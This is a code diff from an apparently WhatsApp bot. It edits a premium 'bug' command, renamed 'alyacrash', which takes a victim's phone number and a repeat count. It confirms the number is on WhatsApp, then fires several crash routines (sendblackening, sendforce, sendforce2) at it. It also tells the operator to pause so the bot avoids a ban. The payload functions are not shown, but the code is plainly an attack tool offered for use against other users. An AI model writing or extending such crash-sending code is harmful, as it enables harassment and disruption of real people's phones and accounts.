@@ -20829,13 +20829,13 @@ case 'clearchat':
 m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
 break
 //================{Bug Cases}===========\\
-case "xandroid": {
+case "alyacrash": {
   if (!isPremium) return replygcalya(mess.prem)
   if (!text) return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+    return replygcalya(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcalya("Amount must be a number");
@@ -20851,9 +20851,11 @@ case "xandroid": {
     return replygcalya("The number is not registered on WhatsApp");
   }
   replygcalya("please wait, " + command + " bug is in process..");
-  await sleep(2000); // Adjusted sleep time for clarity
+  sendblackening(whatsappNumber, encodedAmount);
+  sendforce2(whatsappNumber, encodedAmount);
+  sendforce(whatsappNumber, encodedAmount);
   sendVariousMessages(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
+  await sleep(2500); 
   sendMessageWithMentions(
     "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
